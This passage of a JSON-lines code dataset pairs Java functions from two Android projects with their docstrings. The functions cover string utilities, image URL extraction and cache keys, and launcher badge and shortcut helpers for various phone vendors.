\u6307\u5411\u4e0a\u4e00\u4e2a\u5206\u9694\u7b26\u540e\u7b2c\u4e00\u4e2a\u5b57\u7b26\n\tArrayList<String> list = new ArrayList<String>();\n\n\twhile ((cursor = input.indexOf(separator, cursor)) != -1) {\n\n\t\tString token = input.substring(lastPos, cursor);\n\t\tlist.add(token);\n\n\t\tlastPos = cursor + separator.length();\n\n\t\tcursor = lastPos;\n\t}\n\n\tif (lastPos < input.length())\n\t\tlist.add(input.substring(lastPos));\n\n\treturn (String[]) list.toArray(new String[list.size()]);\n}", "path": "src\\com\\cundong\\izhihu\\util\\StringUtils.java", "repo_name": "cundong/ZhihuPaper", "stars": 936, "license": "None", "language": "java", "size": 15952}
{"docstring": "/**\n * \u4ecebody\u5b57\u6bb5\u4e2d\u83b7\u53d6\u6240\u6709<img\u6807\u7b7e \u4f8b\uff1ahttp://news-at.zhihu.com/api/3/news/4074764\n * \n * @param html\n * @return\n */\n", "func_signal": "private ArrayList<String> getImgs(String html)", "code": "{\n\n\tArrayList<String> imgList = new ArrayList<String>();\n\n\tDocument doc = Jsoup.parse(html);\n\tElements es = doc.getElementsByTag(\"img\");\n\t\n\tfor (Element e : es) {\n\t\tString src = e.attr(\"src\");\n\n\t\tString newImgUrl = src.replaceAll(\"\\\"\", \"\");\n\t\tnewImgUrl = newImgUrl.replace('\\\\', ' ');\n\t\tnewImgUrl = newImgUrl.replaceAll(\" \", \"\");\n\n\t\tif(!TextUtils.isEmpty(newImgUrl)) {\n\t\t\timgList.add(newImgUrl);\n\t\t}\n\t}\n\t\n\treturn imgList;\n}", "path": "src\\com\\cundong\\izhihu\\task\\OfflineDownloadTask.java", "repo_name": "cundong/ZhihuPaper", "stars": 936, "license": "None", "language": "java", "size": 15952}
{"docstring": "/**\n * convert int array to Integer array\n * \n * @param source\n * @return\n */\n", "func_signal": "public static Integer[] transformIntArray(int[] source)", "code": "{\n    Integer[] destin = new Integer[source.length];\n    for (int i = 0; i < source.length; i++) {\n        destin[i] = source[i];\n    }\n    return destin;\n}", "path": "src\\com\\cundong\\izhihu\\util\\ObjectUtils.java", "repo_name": "cundong/ZhihuPaper", "stars": 936, "license": "None", "language": "java", "size": 15952}
{"docstring": "/**\n * \u5c06\u7528\u6237\u8bf7\u6c42\u7684url\u8f6c\u5316\u4e3akey\u503c\uff0c\u901a\u8fc7\u8fd9\u4e2akey\u503c\uff0c\u53ef\u4ee5\u8bfb\u53d6\u6570\u636e\u5e93\u4e2d\u7684\u7f13\u5b58\u6570\u636e\n * \u6ce8\u610f\uff1a\u9700\u8981\u6e05\u9664url\u4e2d\u7684token\uff0c\u8fd9\u6837token\u5373\u4f7f\u53d8\u5316\u4e86\uff0c\u4e5f\u80fd\u8bfb\u53d6\u5230\u7f13\u5b58\n * \n * @param url\n * @return\n */\n", "func_signal": "public static String getUrlKey(String url)", "code": "{\n\n\tif(TextUtils.isEmpty(url))\n\t\treturn \"\";\n\t\n\tStringBuilder sb = new StringBuilder();\n\n\tString[] array = StringUtils.split(url, \"&\");\n\tfor (int i = 0; i < array.length; i++) {\n\t\tif (!array[i].startsWith(\"token\")) {\n\t\t\tsb.append(array[i]);\n\t\t}\n\t}\n\t\n\treturn MD5Util.encrypt(sb.toString());\n}", "path": "src\\com\\cundong\\izhihu\\http\\UrlUtils.java", "repo_name": "cundong/ZhihuPaper", "stars": 936, "license": "None", "language": "java", "size": 15952}
{"docstring": "/**\n * \u622a\u53d6\u5b57\u7b26\u4e32\n * \n * @param inputUrl\n * @param length\n * @return\n */\n", "func_signal": "public static String subString(String inputUrl, int length)", "code": "{\n\tif (isBlank(inputUrl))\n\t\treturn inputUrl;\n\n\tif (inputUrl.length() > length) {\n\t\treturn inputUrl.substring(0, length);\n\t} else {\n\t\treturn inputUrl;\n\t}\n}", "path": "src\\com\\cundong\\izhihu\\util\\StringUtils.java", "repo_name": "cundong/ZhihuPaper", "stars": 936, "license": "None", "language": "java", "size": 15952}
{"docstring": "/***\n * \u751f\u6210\u6709\u6570\u5b57\u7684\u56fe\u7247(\u6ca1\u6709\u8fb9\u6846)\n *\n * @param context   context\n * @param icon      \u56fe\u7247\n * @param isShowNum \u662f\u5426\u8981\u7ed8\u5236\u6570\u5b57\n * @param num       \u6570\u5b57\u5b57\u7b26\u4e32\uff1a\u6574\u578b\u6570\u5b57 \u8d85\u8fc799\uff0c\u663e\u793a\u4e3a\"99+\"\n * @return \u751f\u6210\u6709\u6570\u5b57\u7684\u56fe\u7247\n */\n", "func_signal": "public static Bitmap generatorNumIcon(Context context, Bitmap icon, boolean isShowNum, String num)", "code": "{\n    DisplayMetrics dm = context.getResources().getDisplayMetrics();\n    //\u57fa\u51c6\u5c4f\u5e55\u5bc6\u5ea6\n    float baseDensity = 1.5f;//240dpi\n    float factor = dm.density / baseDensity;\n    Log.e(TAG, \"density:\" + dm.density);\n    Log.e(TAG, \"dpi:\" + dm.densityDpi);\n    Log.e(TAG, \"factor:\" + factor);\n    // \u521d\u59cb\u5316\u753b\u5e03\n    int iconSize = (int) context.getResources().getDimension(android.R.dimen.app_icon_size);\n    Bitmap numIcon = Bitmap.createBitmap(iconSize, iconSize, Bitmap.Config.ARGB_8888);\n    Canvas canvas = new Canvas(numIcon);\n    // \u62f7\u8d1d\u56fe\u7247\n    Paint iconPaint = new Paint();\n    iconPaint.setDither(true);// \u9632\u6296\u52a8\n    iconPaint.setFilterBitmap(true);// \u7528\u6765\u5bf9Bitmap\u8fdb\u884c\u6ee4\u6ce2\u5904\u7406\uff0c\u8fd9\u6837\uff0c\u5f53\u4f60\u9009\u62e9Drawable\u65f6\uff0c\u4f1a\u6709\u6297\u952f\u9f7f\u7684\u6548\u679c\n    Rect src = new Rect(0, 0, icon.getWidth(), icon.getHeight());\n    Rect dst = new Rect(0, 0, iconSize, iconSize);\n    canvas.drawBitmap(icon, src, dst, iconPaint);\n    if (isShowNum) {\n        if (TextUtils.isEmpty(num)) {\n            num = \"0\";\n        }\n        if (!TextUtils.isDigitsOnly(num)) {\n            //\u975e\u6570\u5b57\n            Log.e(TAG, \"the num is not digit :\" + num);\n            num = \"0\";\n        }\n        int numInt = Integer.valueOf(num);\n        if (numInt > 99) {//\u8d85\u8fc799\n            num = \"99+\";\n            // \u542f\u7528\u6297\u952f\u9f7f\u548c\u4f7f\u7528\u8bbe\u5907\u7684\u6587\u672c\u5b57\u4f53\u5927\u5c0f\n            Paint numPaint = new Paint(Paint.ANTI_ALIAS_FLAG | Paint.DEV_KERN_TEXT_FLAG);\n            numPaint.setColor(Color.WHITE);\n            numPaint.setTextSize(20f * factor);\n            numPaint.setTypeface(Typeface.DEFAULT_BOLD);\n            int textWidth = (int) numPaint.measureText(num, 0, num.length());\n            Log.e(TAG, \"text width:\" + textWidth);\n            int circleCenter = (int) (15 * factor);//\u4e2d\u5fc3\u5750\u6807\n            int circleRadius = (int) (13 * factor);//\u5706\u7684\u534a\u5f84\n            //\u7ed8\u5236\u5de6\u8fb9\u7684\u5706\u5f62\n            Paint leftCirPaint = new Paint(Paint.ANTI_ALIAS_FLAG);\n            leftCirPaint.setColor(Color.RED);\n            canvas.drawCircle(iconSize - circleRadius - textWidth + (10 * factor), circleCenter, circleRadius, leftCirPaint);\n            //\u7ed8\u5236\u53f3\u8fb9\u7684\u5706\u5f62\n            Paint rightCirPaint = new Paint(Paint.ANTI_ALIAS_FLAG);\n            rightCirPaint.setColor(Color.RED);\n            canvas.drawCircle(iconSize - circleRadius, circleCenter, circleRadius, rightCirPaint);\n            //\u7ed8\u5236\u4e2d\u95f4\u7684\u8ddd\u5f62\n            Paint rectPaint = new Paint(Paint.ANTI_ALIAS_FLAG);\n            rectPaint.setColor(Color.RED);\n            RectF oval = new RectF(iconSize - circleRadius - textWidth + (10 * factor), 2 * factor, iconSize - circleRadius, circleRadius * 2 + 2 * factor);\n            canvas.drawRect(oval, rectPaint);\n            //\u7ed8\u5236\u6570\u5b57\n            canvas.drawText(num, (iconSize - textWidth / 2 - (24 * factor)), 23 * factor, numPaint);\n        } else {//<=99\n            // \u542f\u7528\u6297\u952f\u9f7f\u548c\u4f7f\u7528\u8bbe\u5907\u7684\u6587\u672c\u5b57\u4f53\u5927\u5c0f\n            Paint numPaint = new Paint(Paint.ANTI_ALIAS_FLAG | Paint.DEV_KERN_TEXT_FLAG);\n            numPaint.setColor(Color.WHITE);\n            numPaint.setTextSize(20f * factor);\n            numPaint.setTypeface(Typeface.DEFAULT_BOLD);\n            int textWidth = (int) numPaint.measureText(num, 0, num.length());\n            Log.e(TAG, \"text width:\" + textWidth);\n            //\u7ed8\u5236\u5916\u9762\u7684\u5706\u5f62\n            //Paint outCirPaint = new Paint(Paint.ANTI_ALIAS_FLAG);\n            //outCirPaint.setColor(Color.WHITE);\n            //canvas.drawCircle(iconSize - 15, 15, 15, outCirPaint);\n            //\u7ed8\u5236\u5185\u90e8\u7684\u5706\u5f62\n            Paint inCirPaint = new Paint(Paint.ANTI_ALIAS_FLAG);\n            inCirPaint.setColor(Color.RED);\n            canvas.drawCircle(iconSize - 15 * factor, 15 * factor, 15 * factor, inCirPaint);\n            //\u7ed8\u5236\u6570\u5b57\n            canvas.drawText(num, (iconSize - textWidth / 2 - 15 * factor), 22 * factor, numPaint);\n        }\n    }\n    return numIcon;\n}", "path": "shortcut_lib\\src\\main\\java\\com\\xys\\badge_lib\\AppShortCutUtil.java", "repo_name": "xuyisheng/ShortcutHelper", "stars": 997, "license": "None", "language": "java", "size": 128}
{"docstring": "/***\n * dp to px\n *\n * @param dip dip\n * @return px\n */\n", "func_signal": "public static int dipToPixels(Context context, int dip)", "code": "{\n    Resources r = context.getResources();\n    float px = TypedValue.applyDimension(TypedValue.COMPLEX_UNIT_DIP, dip, r.getDisplayMetrics());\n    return (int) px;\n}", "path": "shortcut_lib\\src\\main\\java\\com\\xys\\badge_lib\\AppShortCutUtil.java", "repo_name": "xuyisheng/ShortcutHelper", "stars": 997, "license": "None", "language": "java", "size": 128}
{"docstring": "/**\n * \u8bbe\u7f6eMIUI\u7684Badge\n *\n * @param context context\n * @param count   count\n */\n", "func_signal": "private static void setBadgeOfMIUI(Context context, int count, int iconResId)", "code": "{\n    Log.d(\"xys\", \"Launcher : MIUI\");\n    NotificationManager mNotificationManager = (NotificationManager) context\n            .getSystemService(Context.NOTIFICATION_SERVICE);\n    NotificationCompat.Builder builder = new NotificationCompat.Builder(context);\n    builder.setContentTitle(\"title\").setContentText(\"text\").setSmallIcon(iconResId);\n    Notification notification = builder.build();\n    try {\n        Field field = notification.getClass().getDeclaredField(\"extraNotification\");\n        Object extraNotification = field.get(notification);\n        Method method = extraNotification.getClass().getDeclaredMethod(\"setMessageCount\", int.class);\n        method.invoke(extraNotification, count);\n    } catch (Exception e) {\n        e.printStackTrace();\n    }\n    mNotificationManager.notify(0, notification);\n}", "path": "shortcut_lib\\src\\main\\java\\com\\xys\\badge_lib\\BadgeUtil.java", "repo_name": "xuyisheng/ShortcutHelper", "stars": 997, "license": "None", "language": "java", "size": 128}
{"docstring": "/***\n * \u5220\u9664\u539f\u751f\u7cfb\u7edf\u7684\u5feb\u6377\u65b9\u5f0f\n *\n * @param context context\n * @param clazz   \u542f\u52a8\u7684activity\n */\n", "func_signal": "public static void deleteRawShortCut(Context context, Class<?> clazz, String name)", "code": "{\n    Intent intent = new Intent(\"com.android.launcher.action.UNINSTALL_SHORTCUT\");\n    //\u5feb\u6377\u65b9\u5f0f\u7684\u540d\u79f0\n    intent.putExtra(Intent.EXTRA_SHORTCUT_NAME, name);\n    Intent intent2 = new Intent();\n    intent2.setClass(context, clazz);\n    intent2.setAction(Intent.ACTION_MAIN);\n    intent2.addCategory(Intent.CATEGORY_LAUNCHER);\n    intent.putExtra(Intent.EXTRA_SHORTCUT_INTENT, intent2);\n    context.sendBroadcast(intent);\n}", "path": "shortcut_lib\\src\\main\\java\\com\\xys\\badge_lib\\AppShortCutUtil.java", "repo_name": "xuyisheng/ShortcutHelper", "stars": 997, "license": "None", "language": "java", "size": 128}
{"docstring": "/**\n * \u8bbe\u7f6eHTC\u7684Badge\n *\n * @param context context\n * @param count   count\n */\n", "func_signal": "private static void setBadgeOfHTC(Context context, int count)", "code": "{\n    Intent intentNotification = new Intent(\"com.htc.launcher.action.SET_NOTIFICATION\");\n    ComponentName localComponentName = new ComponentName(context.getPackageName(),\n            com.xys.badge_lib.AppInfoUtil.getLauncherClassName(context));\n    intentNotification.putExtra(\"com.htc.launcher.extra.COMPONENT\", localComponentName.flattenToShortString());\n    intentNotification.putExtra(\"com.htc.launcher.extra.COUNT\", count);\n    context.sendBroadcast(intentNotification);\n\n    Intent intentShortcut = new Intent(\"com.htc.launcher.action.UPDATE_SHORTCUT\");\n    intentShortcut.putExtra(\"packagename\", context.getPackageName());\n    intentShortcut.putExtra(\"count\", count);\n    context.sendBroadcast(intentShortcut);\n}", "path": "shortcut_lib\\src\\main\\java\\com\\xys\\badge_lib\\BadgeUtil.java", "repo_name": "xuyisheng/ShortcutHelper", "stars": 997, "license": "None", "language": "java", "size": 128}
{"docstring": "/***\n * \u5f97\u5230\u4e00\u4e2a\u9ed8\u8ba4\u7684\u80cc\u666f\uff1a\u5706\u89d2\u77e9\u5f62<br><br>\n * \u4f7f\u7528\u4ee3\u7801\u6765\u751f\u6210\u4e00\u4e2a\u80cc\u666f\uff1a\u76f8\u5f53\u4e8e\u7528<shape>\u7684xml\u7684\u80cc\u666f\n *\n * @return \u5f97\u5230\u4e00\u4e2a\u9ed8\u8ba4\u7684\u80cc\u666f\n */\n", "func_signal": "private static ShapeDrawable getDefaultBackground(Context context)", "code": "{\n    //\u8fd9\u4e2a\u662f\u4e3a\u4e86\u5e94\u5bf9\u4e0d\u540c\u5206\u8fa8\u7387\u7684\u624b\u673a\uff0c\u5c4f\u5e55\u517c\u5bb9\u6027\n    int r = dipToPixels(context, DEFAULT_CORNER_RADIUS_DIP);\n    float[] outerR = new float[]{r, r, r, r, r, r, r, r};\n    //\u5706\u89d2\u77e9\u5f62\n    RoundRectShape rr = new RoundRectShape(outerR, null, null);\n    ShapeDrawable drawable = new ShapeDrawable(rr);\n    drawable.getPaint().setColor(DEFAULT_NUM_COLOR);//\u8bbe\u7f6e\u989c\u8272\n    return drawable;\n}", "path": "shortcut_lib\\src\\main\\java\\com\\xys\\badge_lib\\AppShortCutUtil.java", "repo_name": "xuyisheng/ShortcutHelper", "stars": 997, "license": "None", "language": "java", "size": 128}
{"docstring": "/***\n * \u7d22\u5c3c\u624b\u673a\uff1a\u5e94\u7528\u56fe\u6807\u7684\u5feb\u6377\u65b9\u5f0f\u4e0a\u52a0\u6570\u5b57\n *\n * @param context context\n * @param num     num\n */\n", "func_signal": "public static void sonyShortCut(Context context, String num)", "code": "{\n    String activityName = getLaunchActivityName(context);\n    if (activityName == null) {\n        return;\n    }\n    Intent localIntent = new Intent();\n    int numInt = Integer.valueOf(num);\n    boolean isShow = true;\n    if (numInt < 1) {\n        num = \"\";\n        isShow = false;\n    } else if (numInt > 99) {\n        num = \"99\";\n    }\n    localIntent.putExtra(\"com.sonyericsson.home.intent.extra.badge.SHOW_MESSAGE\", isShow);\n    localIntent.setAction(\"com.sonyericsson.home.action.UPDATE_BADGE\");\n    localIntent.putExtra(\"com.sonyericsson.home.intent.extra.badge.ACTIVITY_NAME\", activityName);\n    localIntent.putExtra(\"com.sonyericsson.home.intent.extra.badge.MESSAGE\", num);\n    localIntent.putExtra(\"com.sonyericsson.home.intent.extra.badge.PACKAGE_NAME\", context.getPackageName());\n    context.sendBroadcast(localIntent);\n}", "path": "shortcut_lib\\src\\main\\java\\com\\xys\\badge_lib\\AppShortCutUtil.java", "repo_name": "xuyisheng/ShortcutHelper", "stars": 997, "license": "None", "language": "java", "size": 128}
{"docstring": "/**\n * \u5220\u9664\u5feb\u6377\u65b9\u5f0f\n *\n * @param context context\n * @param clazz   clazz\n */\n", "func_signal": "public static void deleteShortCut(Context context, Class<?> clazz, String name)", "code": "{\n    Log.e(TAG, \"delShortcut....\");\n    if (Build.MANUFACTURER.equalsIgnoreCase(\"Xiaomi\")) {\n        //\u5c0f\u7c73\n        //\u5f53\u4e3a\"\"\u65f6\uff0c\u4e0d\u663e\u793a\u6570\u5b57\uff0c\u76f8\u5f53\u4e8e\u9690\u85cf\u4e86)\n        xiaoMiShortCut(context, clazz, \"\");\n    } else if (Build.MANUFACTURER.equalsIgnoreCase(\"samsung\")) {\n        //\u4e09\u661f\n        samsungShortCut(context, \"0\");\n    } else {//\u5176\u4ed6\u539f\u751f\u7cfb\u7edf\u624b\u673a\n        //\u5220\u9664\u663e\u793a\u6570\u5b57\u7684\u5feb\u6377\u65b9\u5f0f\n        deleteRawShortCut(context, clazz, name);\n        //\u5b89\u88c5\u4e0d\u663e\u793a\u6570\u5b57\u7684\u5feb\u6377\u65b9\u5f0f\n        //installRawShortCut(context, clazz, false, \"0\");\n    }\n}", "path": "shortcut_lib\\src\\main\\java\\com\\xys\\badge_lib\\AppShortCutUtil.java", "repo_name": "xuyisheng/ShortcutHelper", "stars": 997, "license": "None", "language": "java", "size": 128}
{"docstring": "/**\n * \u6dfb\u52a0\u5feb\u6377\u65b9\u5f0f\n *\n * @param context      context\n * @param actionIntent \u8981\u542f\u52a8\u7684Intent\n * @param name         name\n * @param allowRepeat  \u662f\u5426\u5141\u8bb8\u91cd\u590d\n * @param iconBitmap   \u5feb\u6377\u65b9\u5f0f\u56fe\u6807\n */\n", "func_signal": "public static void addShortcut(Context context, Intent actionIntent, String name,\n                               boolean allowRepeat, Bitmap iconBitmap)", "code": "{\n    Intent addShortcutIntent = new Intent(ACTION_ADD_SHORTCUT);\n    // \u662f\u5426\u5141\u8bb8\u91cd\u590d\u521b\u5efa\n    addShortcutIntent.putExtra(\"duplicate\", allowRepeat);\n    // \u5feb\u6377\u65b9\u5f0f\u7684\u6807\u9898\n    addShortcutIntent.putExtra(Intent.EXTRA_SHORTCUT_NAME, name);\n    // \u5feb\u6377\u65b9\u5f0f\u7684\u56fe\u6807\n    addShortcutIntent.putExtra(Intent.EXTRA_SHORTCUT_ICON, iconBitmap);\n    // \u5feb\u6377\u65b9\u5f0f\u7684\u52a8\u4f5c\n    addShortcutIntent.putExtra(Intent.EXTRA_SHORTCUT_INTENT, actionIntent);\n    context.sendBroadcast(addShortcutIntent);\n}", "path": "shortcut_lib\\src\\main\\java\\com\\xys\\shortcut_lib\\ShortcutUtils.java", "repo_name": "xuyisheng/ShortcutHelper", "stars": 997, "license": "None", "language": "java", "size": 128}
{"docstring": "/***\n * \u4e09\u661f\u624b\u673a\uff1a\u5e94\u7528\u56fe\u6807\u7684\u5feb\u6377\u65b9\u5f0f\u4e0a\u52a0\u6570\u5b57\n *\n * @param context context\n * @param num     num\n */\n", "func_signal": "public static void samsungShortCut(Context context, String num)", "code": "{\n    int numInt = Integer.valueOf(num);\n    if (numInt < 1) {\n        num = \"0\";\n    } else if (numInt > 99) {\n        num = \"99\";\n    }\n    String activityName = getLaunchActivityName(context);\n    Intent localIntent = new Intent(\"android.intent.action.BADGE_COUNT_UPDATE\");\n    localIntent.putExtra(\"badge_count\", num);\n    localIntent.putExtra(\"badge_count_package_name\", context.getPackageName());\n    localIntent.putExtra(\"badge_count_class_name\", activityName);\n    context.sendBroadcast(localIntent);\n}", "path": "shortcut_lib\\src\\main\\java\\com\\xys\\badge_lib\\AppShortCutUtil.java", "repo_name": "xuyisheng/ShortcutHelper", "stars": 997, "license": "None", "language": "java", "size": 128}
{"docstring": "/**\n * \u8bbe\u7f6eNova\u7684Badge\n *\n * @param context context\n * @param count   count\n */\n", "func_signal": "private static void setBadgeOfNova(Context context, int count)", "code": "{\n    ContentValues contentValues = new ContentValues();\n    contentValues.put(\"tag\", context.getPackageName() + \"/\" +\n            com.xys.badge_lib.AppInfoUtil.getLauncherClassName(context));\n    contentValues.put(\"count\", count);\n    context.getContentResolver().insert(Uri.parse(\"content://com.teslacoilsw.notifier/unread_count\"),\n            contentValues);\n}", "path": "shortcut_lib\\src\\main\\java\\com\\xys\\badge_lib\\BadgeUtil.java", "repo_name": "xuyisheng/ShortcutHelper", "stars": 997, "license": "None", "language": "java", "size": 128}
{"docstring": "/***\n * \u751f\u6210\u6709\u6570\u5b57\u7684\u56fe\u7247(\u6709\u8fb9\u6846\u7684)\n *\n * @param context   context\n * @param icon      \u56fe\u7247\n * @param isShowNum \u662f\u5426\u8981\u7ed8\u5236\u6570\u5b57\n * @param num       \u6570\u5b57\u5b57\u7b26\u4e32\uff1a\u6574\u578b\u6570\u5b57 \u8d85\u8fc799\uff0c\u663e\u793a\u4e3a\"99+\"\n * @return \u751f\u6210\u6709\u6570\u5b57\u7684\u56fe\u7247\n */\n", "func_signal": "public static Bitmap generatorNumIcon4(Context context, Bitmap icon, boolean isShowNum, String num)", "code": "{\n    DisplayMetrics dm = context.getResources().getDisplayMetrics();\n    //\u57fa\u51c6\u5c4f\u5e55\u5bc6\u5ea6\n    float baseDensity = 1.5f;//240dpi\n    float factor = dm.density / baseDensity;\n    Log.e(TAG, \"density:\" + dm.density);\n    Log.e(TAG, \"dpi:\" + dm.densityDpi);\n    Log.e(TAG, \"factor:\" + factor);\n    // \u521d\u59cb\u5316\u753b\u5e03\n    int iconSize = (int) context.getResources().getDimension(android.R.dimen.app_icon_size);\n    Bitmap numIcon = Bitmap.createBitmap(iconSize, iconSize, Bitmap.Config.ARGB_8888);\n    Canvas canvas = new Canvas(numIcon);\n    // \u62f7\u8d1d\u56fe\u7247\n    Paint iconPaint = new Paint();\n    iconPaint.setDither(true);// \u9632\u6296\u5904\u7406\n    iconPaint.setFilterBitmap(true);// \u7528\u6765\u5bf9Bitmap\u8fdb\u884c\u6ee4\u6ce2\u5904\u7406\uff0c\u8fd9\u6837\uff0c\u5f53\u4f60\u9009\u62e9Drawable\u65f6\uff0c\u4f1a\u6709\u6297\u952f\u9f7f\u7684\u6548\u679c\n    Rect src = new Rect(0, 0, icon.getWidth(), icon.getHeight());\n    Rect dst = new Rect(0, 0, iconSize, iconSize);\n    canvas.drawBitmap(icon, src, dst, iconPaint);\n    if (isShowNum) {\n        if (TextUtils.isEmpty(num)) {\n            num = \"0\";\n        }\n        if (!TextUtils.isDigitsOnly(num)) {\n            //\u975e\u6570\u5b57\n            Log.e(TAG, \"the num is not digit :\" + num);\n            num = \"0\";\n        }\n        int numInt = Integer.valueOf(num);\n        if (numInt > 99) {//\u8d85\u8fc799\n            num = \"99+\";\n        }\n        //\u542f\u7528\u6297\u952f\u9f7f\u548c\u4f7f\u7528\u8bbe\u5907\u7684\u6587\u672c\u5b57\u4f53\n        //\u6d4b\u91cf\u6587\u672c\u5360\u7528\u7684\u5bbd\u5ea6\n        Paint numPaint = new Paint(Paint.ANTI_ALIAS_FLAG | Paint.DEV_KERN_TEXT_FLAG);\n        numPaint.setColor(Color.WHITE);\n        numPaint.setTextSize(25f * factor);\n        numPaint.setTypeface(Typeface.DEFAULT_BOLD);\n        int textWidth = (int) numPaint.measureText(num, 0, num.length());\n        Log.e(TAG, \"text width:\" + textWidth);\n        /**----------------------------------*\n         * TODO \u7ed8\u5236\u5706\u89d2\u77e9\u5f62\u80cc\u666f start\n         *------------------------------------*/\n        //\u8fb9\u6846\u7684\u5bbd\u5ea6\n        int strokeThickness = (int) (DEFAULT_STROKE_WIDTH_DIP * factor);\n        //\u5706\u89d2\u77e9\u5f62\u80cc\u666f\u7684\u5bbd\u5ea6\n        float radiusPx = 15 * factor;\n        int backgroundHeight = (int) (2 * (radiusPx + strokeThickness));//2*(\u534a\u5f84+\u8fb9\u6846\u5bbd\u5ea6)\n        int backgroundWidth = textWidth > backgroundHeight ? (int) (textWidth + 10 * factor + 2 * strokeThickness) : backgroundHeight;\n        canvas.save();//\u4fdd\u5b58\u72b6\u6001\n        ShapeDrawable drawable = getDefaultBackground2(context);\n        drawable.setIntrinsicHeight(backgroundHeight);\n        drawable.setIntrinsicWidth(backgroundWidth);\n        drawable.setBounds(0, 0, backgroundWidth, backgroundHeight);\n        canvas.translate(iconSize - backgroundWidth - strokeThickness, 2 * strokeThickness);\n        drawable.draw(canvas);\n        canvas.restore();//\u91cd\u7f6e\u4e3a\u4e4b\u524d\u4fdd\u5b58\u7684\u72b6\u6001\n        /**----------------------------------*\n         * TODO \u7ed8\u5236\u5706\u89d2\u77e9\u5f62\u80cc\u666f end\n         *------------------------------------*/\n        //\u7ed8\u5236\u6570\u5b57\n        canvas.drawText(num, (float) (iconSize - (backgroundWidth + textWidth + 2 * strokeThickness) / 2), (float) (25 * factor + 2.5 * strokeThickness), numPaint);\n    }\n    return numIcon;\n}", "path": "shortcut_lib\\src\\main\\java\\com\\xys\\badge_lib\\AppShortCutUtil.java", "repo_name": "xuyisheng/ShortcutHelper", "stars": 997, "license": "None", "language": "java", "size": 128}
{"docstring": "/***\n * \u53d6\u5f97\u5f53\u524d\u5e94\u7528\u7684\u542f\u52a8activity\u7684\u540d\u79f0\uff1a\n * mainfest.xml\u4e2d\u914d\u7f6e\u7684 android:name:\"\n *\n * @param context context\n * @return \u53d6\u5f97\u5f53\u524d\u5e94\u7528\u7684\u542f\u52a8activity\u7684\u540d\u79f0\n */\n", "func_signal": "public static String getLaunchActivityName(Context context)", "code": "{\n    PackageManager localPackageManager = context.getPackageManager();\n    Intent localIntent = new Intent(\"android.intent.action.MAIN\");\n    localIntent.addCategory(\"android.intent.category.LAUNCHER\");\n    try {\n        for (ResolveInfo localResolveInfo : localPackageManager.queryIntentActivities(localIntent, 0)) {\n            if (!localResolveInfo.activityInfo.applicationInfo.packageName.equalsIgnoreCase(context.getPackageName()))\n                continue;\n            return localResolveInfo.activityInfo.name;\n        }\n    } catch (Exception localException) {\n        return null;\n    }\n    return null;\n}", "path": "shortcut_lib\\src\\main\\java\\com\\xys\\badge_lib\\AppShortCutUtil.java", "repo_name": "xuyisheng/ShortcutHelper", "stars": 997, "license": "None", "language": "java", "size": 128}
{"docstring": "/***\n * \u5728\u5c0f\u7c73\u5e94\u7528\u56fe\u6807\u7684\u5feb\u6377\u65b9\u5f0f\u4e0a\u52a0\u6570\u5b57<br>\n *\n * @param context context\n * @param num     \u663e\u793a\u7684\u6570\u5b57\uff1a\u5927\u4e8e99\uff0c\u4e3a\"99\"\uff0c\u5f53\u4e3a\"\"\u65f6\uff0c\u4e0d\u663e\u793a\u6570\u5b57\uff0c\u76f8\u5f53\u4e8e\u9690\u85cf\u4e86)<br><br>\n *                <p/>\n *                \u6ce8\u610f\u70b9\uff1a\n *                context.getPackageName()+\"/.\"+clazz.getSimpleName() \uff08\u8fd9\u4e2a\u662f\u542f\u52a8activity\u7684\u8def\u5f84\uff09\u4e2d\u7684\"/.\"\u4e0d\u80fd\u7f3a\u5c11\n */\n", "func_signal": "public static void xiaoMiShortCut(Context context, Class<?> clazz, String num)", "code": "{\n    Log.e(TAG, \"xiaoMiShortCut....\");\n    Intent localIntent = new Intent(\"android.intent.action.APPLICATION_MESSAGE_UPDATE\");\n    localIntent.putExtra(\"android.intent.extra.update_application_component_name\", context.getPackageName() + \"/.\" + clazz.getSimpleName());\n    if (TextUtils.isEmpty(num)) {\n        num = \"\";\n    } else {\n        int numInt = Integer.valueOf(num);\n        if (numInt > 0) {\n            if (numInt > 99) {\n                num = \"99\";\n            }\n        } else {\n            num = \"0\";\n        }\n    }\n    localIntent.putExtra(\"android.intent.extra.update_application_message_text\", num);\n    context.sendBroadcast(localIntent);\n}", "path": "shortcut_lib\\src\\main\\java\\com\\xys\\badge_lib\\AppShortCutUtil.java", "repo_name": "xuyisheng/ShortcutHelper", "stars": 997, "license": "None", "language": "java", "size": 128}
{"docstring": "/***\n * \u53d6\u5f97\u6743\u9650\u76f8\u5e94\u7684\u8ba4\u8bc1URI\n *\n * @param context    context\n * @param permission permission\n * @return \u53d6\u5f97\u6743\u9650\u76f8\u5e94\u7684\u8ba4\u8bc1URI\n */\n", "func_signal": "public static String getAuthorityFromPermission(Context context, String permission)", "code": "{\n    if (TextUtils.isEmpty(permission)) {\n        return null;\n    }\n    List<PackageInfo> packInfos = context.getPackageManager().getInstalledPackages(PackageManager.GET_PROVIDERS);\n    if (packInfos == null) {\n        return null;\n    }\n    for (PackageInfo info : packInfos) {\n        ProviderInfo[] providers = info.providers;\n        if (providers != null) {\n            for (ProviderInfo provider : providers) {\n                if (permission.equals(provider.readPermission)\n                        || permission.equals(provider.writePermission)) {\n                    return provider.authority;\n                }\n            }\n        }\n    }\n    return null;\n}", "path": "shortcut_lib\\src\\main\\java\\com\\xys\\badge_lib\\AppShortCutUtil.java", "repo_name": "xuyisheng/ShortcutHelper", "stars": 997, "license": "None", "language": "java", "size": 128}
